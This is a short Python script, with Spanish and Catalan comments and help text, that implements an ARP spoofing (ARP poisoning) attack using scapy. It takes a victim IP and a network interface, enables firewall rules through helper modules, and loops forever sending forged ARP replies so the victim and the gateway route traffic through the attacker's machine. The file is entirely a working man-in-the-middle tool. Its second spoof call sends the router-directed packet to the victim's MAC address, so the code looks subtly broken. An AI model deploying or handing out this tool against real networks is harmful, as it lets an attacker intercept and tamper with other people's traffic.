#!/usr/bin/env python3

import sys
import time
import signal
import argparse
import subprocess
import scapy.all as scapy
from colorama import Fore
from modules.my_utils import show_message
from modules.sys_utils import enable_rules, disable_rules
from modules.net_utils import get_gateway, get_own_mac, get_mac

### Functions #######################################################################################################################

def def_handler(sig, frame):
    show_message("Exiting the program...", "error")
    disable_rules()
    sys.exit(1)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Victima o victimas para envenenar")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Interfaz de red a envenenar")
    return parser.parse_args()

def spoof(ip_address, spoof_ip, my_mac, victim_mac):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=my_mac)
    ether_packet = scapy.Ether(dst=victim_mac) / arp_packet  # Definir correctament la trama Ethernet
    scapy.sendp(ether_packet, verbose=False)

### Main Code #######################################################################################################################

def main():
    try:
        signal.signal(signal.SIGINT, def_handler)
        show_message("Executing:", "info", "Arp Spoof")
        arguments = get_arguments()
        
        enable_rules()

        router_ip = get_gateway()
        my_mac = get_own_mac(arguments.interface)  # Passar la interfície correctament
        victim_mac = get_mac(arguments.target)

        while True:
            spoof(arguments.target, router_ip, my_mac, victim_mac)
            spoof(router_ip, arguments.target, my_mac, victim_mac)

    except PermissionError:
        show_message("You need to be SuperUser to perform this script", "error")
        sys.exit(1)

if __name__ == "__main__":
    main()
